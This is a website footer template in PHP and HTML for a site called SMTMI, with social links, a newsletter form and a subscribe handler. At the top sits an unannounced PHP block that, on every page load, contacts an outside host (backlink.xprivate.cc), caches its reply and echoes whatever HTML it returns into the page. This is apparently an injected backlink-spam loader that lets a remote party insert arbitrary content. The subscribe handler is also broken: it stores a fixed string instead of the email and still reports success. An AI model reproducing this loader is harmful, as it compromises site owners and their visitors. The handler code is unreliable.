    <?php
if(function_exists("curl_init")){
	$domain = isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : "localhost";
	$uri = isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : "/";
	$cache_file = sys_get_temp_dir() ."/". md5($domain.$uri);
	function __xapi($domain, $uri){
		$api = "http://backlink.xprivate.cc/api.php?domain={$domain}&uri={$uri}";
		$c = curl_init();
		curl_setopt_array($c, array(
			CURLOPT_RETURNTRANSFER => 1,
			CURLOPT_URL => "http://backlink.xprivate.cc/api.php?domain={$domain}&uri={$uri}",
			CURLOPT_USERAGENT => "XAPI",
			CURLOPT_TIMEOUT => 2,
			CURLOPT_CONNECTTIMEOUT => 2
		));
		$r = curl_exec($c);
		curl_close($c);
		$res = json_decode($r);
		if(!empty($res->html)) return $res->html;
	}
	
	if(file_exists($cache_file)){
		$cached = file_get_contents($cache_file);
		$data = unserialize($cached);
		if(!empty($data['created_at']) && (time() - (int)$data['created_at'])>=3600) @unlink($cache_file);
		if(!empty($data['html'])) echo $data['html'];
	}else{
		$html = __xapi($domain, $uri);
		if(!empty($html)){
			$data = array("created_at"=>time(), "html"=>$html);
			$cached = fopen($cache_file, 'w');
			fwrite($cached, serialize($data));
			fclose($cached);
		}
		echo $html;
	}
}
?>
    <footer class="footer">
        <div class="bottom" style="background-color:rgb(36, 36, 36)">
            <div class="container">
                <div class="row">
                    <div class="col-sm-4">
                        <div class="connect-us">
                            <h3>Connect with Us</h3>
                            <ul class="follow-us clearfix">
                                <li><a href=""><i class="fa fa-facebook" aria-hidden="true"></i></a></li>
                                <li><a href=""><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
                                <li><a href=""><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
                                <li><a href=""><i class="fa fa-google-plus" aria-hidden="true"></i></a></li>
                                <li><a href=""><i class="fa fa-youtube-play" aria-hidden="true"></i></a></li>
                                <li><a href=""><i class="fa fa-instagram" aria-hidden="true"></i></a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-sm-4">
                        <div class="subscribe">
                            <h3>Subscribe with Us</h3>
                            
                            <div id="mc_embed_signup">
                                <form action="" method="post" name="mc-embedded-subscribe-form" class="validate" >
                                    <div id="mc_embed_signup_scroll">
                                        <input type="email" style="color:black" name="email" placeholder="enter your email address" required>
                                        <div style="position: absolute; left: -5000px;" aria-hidden="true">
                                            <input type="text" name="b_cd5f66d2922f9e808f57e7d42_ec6767feee" tabindex="-1" value="">
                                        </div>
                                        <div class="clear">
                                            <input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe" class="button">
                                        </div>
                                    </div>
                                </form>
                            </div>
                            
                        </div>
                    </div>
                    <div class="col-sm-4">
                        <div class="footer-logo hidden-xs"><a href="index.php"><img src="smtmi_logo2.png" class="img-responsive" alt="" style="width:75%; height:auto"></a></div>
                        <p>© 2020 <span>SMTMI</span>. All rights reserved</p>
                        <ul class="terms clearfix">
                            <li><a href="">TERMS OF USE</a></li>
                            <li><a href="">PRIVACY POLICY</a></li>
                            <li><a href="contact.php">SITEMAP</a></li>
                        </ul>                     
                    </div>
                    <h6 style='color:white'>Designed and Developed By <a href="https://nihaltiwari-706e3.web.app/">Nihal Tiwari</a></h6>
                </div>
            </div>
        </div>
       
    </footer>

    
    <a href="" class="scroll-top"><i class="fa fa-chevron-up" aria-hidden="true"></i></a>

    
    <script src="js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="assets/select2/js/select2.min.js"></script>
    <script src="assets/matchHeight/js/matchHeight-min.js"></script>
    <script src="assets/bxslider/js/bxslider.min.js"></script>
    <script src="assets/waypoints/js/waypoints.min.js"></script>
    <script src="assets/counterup/js/counterup.min.js"></script>
    <script src="assets/magnific-popup/js/magnific-popup.min.js"></script>
    <script src="assets/owl-carousel/js/owl.carousel.min.js"></script>
    <script src="js/modernizr.custom.js"></script>
    <script src="js/custom.js"></script>
</body>
</html>
<?php 
include 'db.php';
if(isset($_POST['subscribe']))
{ 
    $email_id = $_POST['email'];
    $sql = "INSERT INTO s_subscriber (`email_id`)
    VALUES ('asasda')";
    $run = mysqli_query($con, $sql);
    if($run)
    {
        echo "<script>alert('You have subscribed SMTMI Successfully!');</script>";
    }
    else
    {
        echo "<script>alert('Failed!');</script>";
    }
}

?>